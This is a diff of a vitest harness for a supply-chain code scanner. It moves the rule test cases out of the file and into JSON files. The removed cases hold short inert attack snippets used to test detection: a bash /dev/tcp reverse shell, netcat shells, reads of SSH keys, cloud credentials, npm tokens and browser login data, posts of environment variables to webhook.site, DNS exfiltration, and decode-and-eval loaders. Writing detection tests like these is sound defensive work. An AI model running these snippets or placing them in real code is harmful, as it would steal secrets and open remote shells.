@@ -1,374 +1,68 @@
+import { readdirSync, readFileSync } from 'node:fs';
 import * as path from 'node:path';
 import { beforeAll, describe, expect, it } from 'vitest';
 import type { Language, ResolvedDep } from '../../../src/core/types';
 import { compileRule, loadRules, type CompiledRule } from '../../../src/rules/loader';
 import { scanPackageCode } from '../../../src/scanners/codeScanner';
 
-// Every snippet here is an inert string that is only pattern-matched, never executed.
-type Lang = 'js' | 'py' | 'go' | 'rs' | 'php' | 'java';
-interface Case {
-  lang: Lang;
-  pos: string[];
-  neg: string[];
-}
-
-const CASES: Record<string, Case> = {
-  'exec/node-child-process': {
-    lang: 'js',
-    pos: ["const cp = require('child_process');\ncp.spawn('ls', ['-la']);"],
-    neg: ["const x = require('path');\nspawn();"],
-  },
-  'exec/node-child-process-shell': {
-    lang: 'js',
-    pos: ["require('child_process').exec('ls')", "spawn('ls', [], { shell: true })"],
-    neg: ["spawn('git', ['status'], { shell: false })"],
-  },
-  'exec/node-dynamic-command': {
-    lang: 'js',
-    pos: ['execSync(`curl ${url}`)', 'exec(cmd + args)'],
-    neg: ["execSync('git status')"],
-  },
-  'exec/python-shell': {
-    lang: 'py',
-    pos: ["os.system('ls')", 'subprocess.run(cmd, shell=True)'],
-    neg: ["subprocess.run(['ls'], shell=False)"],
-  },
-  'exec/python-pty-spawn': { lang: 'py', pos: ["pty.spawn('/bin/bash')"], neg: ['import pty'] },
-  'exec/reverse-shell': {
-    lang: 'js',
-    pos: ["const c = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';", "run('nc -e /bin/sh host 1')"],
-    neg: ["const devices = '/dev/null';"],
-  },
-  'exec/python-socket-shell': {
-    lang: 'py',
-    pos: ["s = socket.socket()\nos.dup2(s.fileno(), 0)\npty.spawn('/bin/sh')"],
-    neg: ['s = socket.socket()\ns.connect(addr)'],
-  },
-  'secrets-fs/ssh-keys': {
-    lang: 'js',
-    pos: ["fs.readFileSync(home + '/.ssh/id_rsa')"],
-    neg: ["const knownHosts = '~/.ssh/known_hosts';"],
-  },
-  'secrets-fs/cloud-credentials': {
-    lang: 'js',
-    pos: ["path.join(home, '.aws/credentials')", "path.join(home, '.kube/config')"],
-    neg: ["const region = 'us-east-1';"],
-  },
-  'secrets-fs/package-manager-tokens': {
-    lang: 'js',
-    pos: ["fs.readFileSync(home + '/.npmrc')"],
-    neg: ["const docs = 'see the npmrc docs';"],
-  },
-  'secrets-fs/browser-data': {
-    lang: 'js',
-    pos: ["const p = 'Google/Chrome/Default/Login Data';"],
-    neg: ["const p = 'Google/Chrome/Default/Preferences';"],
-  },
-  'secrets-fs/macos-keychain': {
-    lang: 'js',
-    pos: ["execSync('security find-generic-password -s x')"],
-    neg: ["const security = require('./security');"],
-  },
-  'secrets-fs/system-shadow': {
-    lang: 'py',
-    pos: ["open('/etc/shadow')"],
-    neg: ["open('/etc/hosts')"],
-  },
-  'secrets-fs/crypto-wallets': {
-    lang: 'js',
-    pos: ["const w = 'Exodus/exodus.wallet';", "const id = 'nkbihfbeogaeaoehlefnkodbefgpgknn';"],
-    neg: ['const wallet = new Wallet();'],
-  },
-  'env-access/serialize-env': {
-    lang: 'js',
-    pos: ['const s = JSON.stringify(process.env);'],
-    neg: ['const s = JSON.stringify(process.env.NODE_ENV);'],
-  },
-  'env-access/enumerate-env': {
-    lang: 'js',
-    pos: ['Object.keys(process.env).forEach((k) => k);'],
-    neg: ['const k = Object.keys(config);'],
-  },
-  'env-access/token-variables': {
-    lang: 'js',
-    pos: ['const t = process.env.GITHUB_TOKEN;', "const t = process.env['NPM_TOKEN'];"],
-    neg: ['const t = process.env.NODE_ENV;'],
-  },
-  'network/exfil-endpoint': {
-    lang: 'js',
-    pos: ["fetch('https://webhook.site/abc')", "const h = 'abc.oast.fun';"],
-    neg: ["fetch('https://api.example.invalid/v1')"],
-  },
-  'network/chat-webhook': {
-    lang: 'js',
-    pos: ["const u = 'https://discord.com/api/webhooks/1/x';"],
-    neg: ["const u = 'https://discord.com/developers';"],
-  },
-  'network/raw-ip-url': {
-    lang: 'js',
-    pos: ["http.get('http://203.0.113.7:8080/x')"],
-    neg: ["http.get('http://127.0.0.1:3000')", "http.get('http://192.168.1.10/')"],
-  },
-  'network/ip-lookup': {
-    lang: 'js',
-    pos: ["fetch('https://api.ipify.org?format=json')"],
-    neg: ["fetch('https://example.invalid')"],
-  },
-  'network/dns-exfiltration': {
-    lang: 'js',
-    pos: ["dns.resolve(Buffer.from(os.hostname()).toString('hex') + '.x.example.invalid', cb)"],
-    neg: ["dns.lookup('example.invalid', cb)"],
-  },
-  'network/python-dns-exfiltration': {
-    lang: 'py',
-    pos: ["socket.gethostbyname(getpass.getuser().encode().hex() + '.x.example.invalid')"],
-    neg: ["socket.gethostbyname('example.invalid')"],
-  },
-  'exfiltration/env-to-network': {
-    lang: 'js',
-    pos: ['const p = JSON.stringify(process.env);\nhttps.request(opts);'],
-    neg: ['const p = JSON.stringify({ a: 1 });\nhttps.request(opts);'],
-  },
-  'exfiltration/python-env-to-network': {
-    lang: 'py',
-    pos: ['requests.post(URL, data=dict(os.environ))'],
-    neg: ["requests.post(URL, data={'a': 1})"],
-  },
-  'exfiltration/secret-file-to-network': {
-    lang: 'js',
-    pos: ["const k = fs.readFileSync(home + '/.ssh/id_rsa');\nfetch(url, { body: k });"],
-    neg: [
-      "const f = process.env.AWS_SHARED_CREDENTIALS_FILE || '~/.aws/credentials';\nfetch(url);",
-    ],
-  },
-  'exfiltration/secret-file-to-webhook': {
-    lang: 'js',
-    pos: ["const k = read('.npmrc');\nfetch('https://webhook.site/x', { body: k });"],
-    neg: ["fetch('https://webhook.site/x');"],
-  },
-  'exfiltration/homedir-read-and-send': {
-    lang: 'js',
-    pos: ["const d = fs.readFileSync(path.join(os.homedir(), '.config/x'));\nfetch(u);"],
-    neg: ["const d = fs.readFileSync('./x');\nfetch(u);"],
-  },
-  'exfiltration/system-info-beacon': {
-    lang: 'js',
-    pos: ['const h = os.hostname();\nconst u = os.userInfo().username;\nhttps.request(o);'],
-    neg: ['const h = os.hostname();\nhttps.request(o);'],
-  },
-  'dynamic-code/eval-non-literal': {
-    lang: 'js',
-    pos: ['eval(code)', 'const f = new Function(body);'],
-    neg: ['model.eval(x)', "const g = new Function('return this')();"],
-  },
-  'dynamic-code/vm-run': {
-    lang: 'js',
-    pos: ['vm.runInNewContext(src, sandbox)'],
-    neg: ["const vm = require('vm');"],
-  },
-  'dynamic-code/module-compile': {
-    lang: 'js',
-    pos: ['m._compile(source, filename)'],
-    neg: ['m._compiled = true;'],
-  },
-  'dynamic-code/decode-and-execute': {
-    lang: 'js',
-    pos: ["eval(Buffer.from(p, 'base64').toString())", 'new Function(atob(p))()'],
-    neg: ["eval('1+1')"],
-  },
-  'dynamic-code/python-exec-non-literal': {
-    lang: 'py',
-    pos: ['exec(payload)'],
-    neg: ["exec(open('pkg/version.py').read())", "exec('x = 1')", 'self.exec(job)'],
-  },
-  'dynamic-code/marshal-loads': {
-    lang: 'py',
-    pos: ['code = marshal.loads(data)'],
-    neg: ['import marshal'],
-  },
-  'dynamic-code/python-hidden-import': {
-    lang: 'py',
-    pos: ["__import__('os').system('id')"],
-    neg: ["__import__('json')"],
-  },
-  'persistence/shell-profile': {
-    lang: 'js',
-    pos: ["fs.appendFileSync(path.join(home, '.bashrc'), line)"],
-    neg: ["const doc = 'add this to your .bashrc';"],
-  },
-  'persistence/autostart': {
-    lang: 'js',
-    pos: ["const p = '~/Library/LaunchAgents/com.x.plist';", "run('crontab -l')"],
-    neg: ["const p = '~/Library/Preferences';"],
-  },
-  'crypto-mining/stratum-pool': {
-    lang: 'js',
-    pos: ["const pool = 'stratum+tcp://pool.example.invalid:3333';"],
-    neg: ["const s = 'stratum';"],
-  },
-  'exec/go-shell': {
-    lang: 'go',
-    pos: ['exec.Command("sh", "-c", cmd).Run()', 'exec.CommandContext(ctx, "/bin/bash", "-c", c)'],
-    neg: ['exec.Command("git", "status")'],
-  },
-  'exec/go-syscall-exec': {
-    lang: 'go',
-    pos: ['syscall.Exec(binary, args, env)'],
-    neg: ['syscall.Getpid()'],
-  },
-  'env-access/go-environ': {
-    lang: 'go',
-    pos: ['for _, kv := range os.Environ() {'],
-    neg: ['home := os.Getenv("HOME")'],
-  },
-  'exfiltration/go-env-to-network': {
-    lang: 'go',
-    pos: ['data := strings.Join(os.Environ(), ",")\nhttp.Post(url, "text/plain", body)'],
-    neg: ['data := os.Getenv("PATH")\nhttp.Post(url, "text/plain", body)'],
-  },
-  'exfiltration/go-homedir-read-and-send': {
-    lang: 'go',
-    pos: ['h, _ := os.UserHomeDir()\nb, _ := os.ReadFile(h + "/.config/x")\nhttp.Post(u, "", r)'],
-    neg: ['h, _ := os.UserHomeDir()\nb, _ := os.ReadFile(h + "/.config/x")'],
-  },
-  'network/go-init-network': {
-    lang: 'go',
-    pos: ['func init() {\n\tresp, _ := http.Get("https://x.example.invalid")\n}'],
-    neg: ['func init() {\n\tregister()\n}'],
-  },
-  'dynamic-code/go-plugin-load': {
-    lang: 'go',
-    pos: ['p, err := plugin.Open(path)'],
-    neg: ['p := plugins.Open'],
-  },
-  'exec/rust-shell': {
-    lang: 'rs',
-    pos: ['Command::new("sh").arg("-c").arg(cmd).status()'],
-    neg: ['Command::new("cc").arg("foo.c").status()'],
-  },
-  'env-access/rust-env-vars': {
-    lang: 'rs',
-    pos: ['for (k, v) in env::vars() {'],
-    neg: ['let home = env::var("HOME");'],
-  },
-  'exfiltration/rust-env-to-network': {
-    lang: 'rs',
-    pos: [
-      'let all: Vec<_> = std::env::vars().collect();\nreqwest::blocking::Client::new().post(url)',
-    ],
-    neg: ['let home = env::var("HOME");\nreqwest::blocking::get(url)'],
-  },
-  'dynamic-code/rust-dynamic-library': {
-    lang: 'rs',
-    pos: ['let lib = unsafe { libloading::Library::new(path)? };'],
-    neg: ['let lib = Library::default();'],
-  },
-  'exec/php-shell': {
-    lang: 'php',
-    pos: ['$out = shell_exec($cmd);', 'system("curl " . $url);'],
-    neg: ['$pdo->exec($sql);', 'Process::exec($x);', 'function systemInfo() {}'],
-  },
-  'env-access/php-environ': {
-    lang: 'php',
-    pos: ['$all = getenv();', '$s = json_encode($_SERVER);'],
-    neg: ['$home = getenv("HOME");'],
-  },
-  'exfiltration/php-env-to-network': {
-    lang: 'php',
-    pos: ['$d = json_encode($_ENV);\n$ch = curl_init($u);\ncurl_exec($ch);'],
-    neg: ['$d = getenv("APP_ENV");\ncurl_exec($ch);'],
-  },
-  'dynamic-code/php-eval': {
-    lang: 'php',
-    pos: ['eval($code);', '$f = create_function("$a", $body);', "preg_replace('/x/e', $r, $s);"],
-    neg: ['$model->eval($x);', 'assert(true);'],
-  },
-  'dynamic-code/php-decode-execute': {
-    lang: 'php',
-    pos: ['eval(base64_decode($p));', 'eval(gzinflate(base64_decode($p)));'],
-    neg: ['$x = base64_decode($p);'],
-  },
-  'dynamic-code/php-request-exec': {
-    lang: 'php',
-    pos: ['eval($_POST["c"]);', 'system($_GET["cmd"]);'],
-    neg: ['$name = htmlspecialchars($_GET["name"]);'],
-  },
-  'exec/java-process': {
-    lang: 'java',
-    pos: ['Process p = Runtime.getRuntime().exec(cmd);', 'new ProcessBuilder(args).start();'],
-    neg: ['Runtime rt = Runtime.getRuntime();'],
-  },
-  'exec/java-shell': {
-    lang: 'java',
-    pos: [
-      'Runtime.getRuntime().exec(new String[] {"sh", "-c", cmd});',
-      'new ProcessBuilder("bash", "-c", c);',
-    ],
-    neg: ['new ProcessBuilder("git", "status");'],
-  },
-  'env-access/java-getenv-all': {
-    lang: 'java',
-    pos: ['Map<String, String> env = System.getenv();'],
-    neg: ['String home = System.getenv("HOME");'],
-  },
-  'exfiltration/java-env-to-network': {
-    lang: 'java',
-    pos: [
-      'String all = System.getenv().toString();\nHttpURLConnection c = (HttpURLConnection) u.openConnection();',
-    ],
-    neg: [
-      'String h = System.getenv("HOME");\nHttpURLConnection c = (HttpURLConnection) u.openConnection();',
-    ],
-  },
-  'dynamic-code/java-runtime-code': {
-    lang: 'java',
-    pos: [
-      'ScriptEngine e = new ScriptEngineManager().getEngineByName("js");',
-      'Class<?> c = defineClass(name, b, 0, b.length);',
-    ],
-    neg: ['ClassLoader cl = getClass().getClassLoader();'],
-  },
-  'network/java-jndi-remote-lookup': {
-    lang: 'java',
-    pos: ['Object o = ctx.lookup("ldap://attacker.example.invalid/a");'],
-    neg: ['Object o = ctx.lookup("java:comp/env/jdbc/db");'],
-  },
-  'crypto-mining/miner': {
-    lang: 'js',
-    pos: ["spawn('./xmrig', args)"],
-    neg: ["const mining = 'data mining';"],
-  },
-};
-
-// Python-language rules that should also be checked against their Python spelling.
-const EXTRA_POSITIVES: Record<string, Array<[Lang, string]>> = {
-  'exfiltration/secret-file-to-network': [
-    [
-      'java',
-      'byte[] k = Files.readAllBytes(Paths.get(home, ".ssh/id_rsa"));\nSocket s = new Socket(host, 443);',
-    ],
-    ['php', '$k = file_get_contents($home . "/.ssh/id_rsa");\n$s = fsockopen($host, 80);'],
-    ['rs', 'let k = fs::read(home.join(".ssh/id_rsa"))?;\nlet s = TcpStream::connect(addr)?;'],
-    ['go', 'b, _ := os.ReadFile(home + "/.ssh/id_rsa")\nhttp.Post(u, "", bytes.NewReader(b))'],
-  ],
-};
-
-const EXTRA_PY_POSITIVES: Record<string, string[]> = {
-  'dynamic-code/decode-and-execute': [
-    'exec(base64.b64decode(p))',
-    'exec(compile(zlib.decompress(p), "<x>", "exec"))',
-  ],
-  'secrets-fs/ssh-keys': ["open(os.path.expanduser('~/.ssh/id_ed25519'))"],
-};
-
-const LANGUAGE: Record<Lang, Language> = {
+/**
+ * Positive and negative cases for every built-in rule live in rule-cases/*.json (one file per
+ * rule pack), so new rule packs add a file instead of editing this harness. Every snippet is an
+ * inert string that is only pattern-matched, never executed.
+ *
+ * Format: { "<rule id>": { "lang": "js", "pos": [...], "neg": [...], "also": [["py", "..."]] } }
+ * A file may also contain { "<existing id>": { "also": [...] } } to add positives in other
+ * languages for a rule defined elsewhere.
+ */
+const LANGUAGE = {
   js: 'javascript',
   py: 'python',
   go: 'go',
   rs: 'rust',
   php: 'php',
   java: 'java',
-};
+  sh: 'shell',
+} as const satisfies Record<string, Language>;
+type Lang = keyof typeof LANGUAGE;
+
+interface Case {
+  lang: Lang;
+  pos: string[];
+  neg: string[];
+  also: Array<[Lang, string]>;
+}
+
+const CASES_DIR = path.join(__dirname, 'rule-cases');
+
+function loadCases(): Record<string, Case> {
+  const cases: Record<string, Case> = {};
+  const extras: Array<[string, Array<[Lang, string]>]> = [];
+  for (const file of readdirSync(CASES_DIR)
+    .filter((f) => f.endsWith('.json'))
+    .sort()) {
+    const doc = JSON.parse(readFileSync(path.join(CASES_DIR, file), 'utf8')) as Record<
+      string,
+      Partial<Case>
+    >;
+    for (const [id, c] of Object.entries(doc)) {
+      if (c.lang === undefined) {
+        extras.push([id, c.also ?? []]);
+        continue;
+      }
+      if (cases[id]) throw new Error(`${file}: cases for ${id} are already defined`);
+      if (!LANGUAGE[c.lang]) throw new Error(`${file}: unknown lang "${c.lang}" for ${id}`);
+      cases[id] = { lang: c.lang, pos: c.pos ?? [], neg: c.neg ?? [], also: c.also ?? [] };
+    }
+  }
+  for (const [id, also] of extras) {
+    if (!cases[id]) throw new Error(`extra positives for ${id}, which has no cases`);
+    cases[id].also.push(...also);
+  }
+  return cases;
+}
+
+const CASES = loadCases();
+
 const dep: ResolvedDep = {
   ecosystem: 'npm',
   name: 'fixture-pkg',
@@ -386,10 +80,9 @@ beforeAll(async () => {
 });
 
 async function ruleIdsFor(lang: Lang, code: string): Promise<string[]> {
-  const file = `/pkg/sample.${lang}`;
   const findings = await scanPackageCode({
     dep,
-    files: [file],
+    files: [`/pkg/sample.${lang}`],
     languageOf: () => LANGUAGE[lang],
     rules,
     maxFileSizeBytes: 1e6,
@@ -399,38 +92,38 @@ async function ruleIdsFor(lang: Lang, code: string): Promise<string[]> {
   return findings.map((f) => f.ruleId);
 }
 
+const lastLine = (code: string) => code.split('\n').at(-1);
+
 describe('built-in rules', () => {
   it('every built-in rule has positive and negative cases', () => {
-    const ids = rules.map((r) => r.rule.id).sort();
-    expect(Object.keys(CASES).sort()).toEqual(ids);
+    expect(Object.keys(CASES).sort()).toEqual(rules.map((r) => r.rule.id).sort());
+    for (const [id, c] of Object.entries(CASES)) {
+      expect(c.pos.length, id).toBeGreaterThan(0);
+      expect(c.neg.length, id).toBeGreaterThan(0);
+    }
   });
 
   for (const [id, c] of Object.entries(CASES)) {
     describe(id, () => {
       for (const code of c.pos) {
-        it(`matches: ${code.split('\n').at(-1)}`, async () => {
+        it(`matches: ${lastLine(code)}`, async () => {
           expect(await ruleIdsFor(c.lang, code)).toContain(id);
         });
       }
       for (const code of c.neg) {
-        it(`ignores: ${code.split('\n').at(-1)}`, async () => {
+        it(`ignores: ${lastLine(code)}`, async () => {
           expect(await ruleIdsFor(c.lang, code)).not.toContain(id);
         });
       }
-      for (const [lang, code] of EXTRA_POSITIVES[id] ?? []) {
-        it(`matches ${lang}: ${code.split('\n').at(-1)}`, async () => {
+      for (const [lang, code] of c.also) {
+        it(`matches ${lang}: ${lastLine(code)}`, async () => {
           expect(await ruleIdsFor(lang, code)).toContain(id);
         });
       }
-      for (const code of EXTRA_PY_POSITIVES[id] ?? []) {
-        it(`matches python: ${code}`, async () => {
-          expect(await ruleIdsFor('py', code)).toContain(id);
-        });
-      }
       it('ignores the positive case when it is commented out', async () => {
-        const commented = (c.pos[0] as string)
-          .split('\n')
-          .map((l) => `${c.lang === 'py' ? '#' : '//'} ${l}`)
+        const prefix = c.lang === 'py' || c.lang === 'sh' ? '#' : '//';
+        const commented = c.pos[0]!.split('\n')
+          .map((l) => `${prefix} ${l}`)
           .join('\n');
         expect(await ruleIdsFor(c.lang, commented)).not.toContain(id);
       });
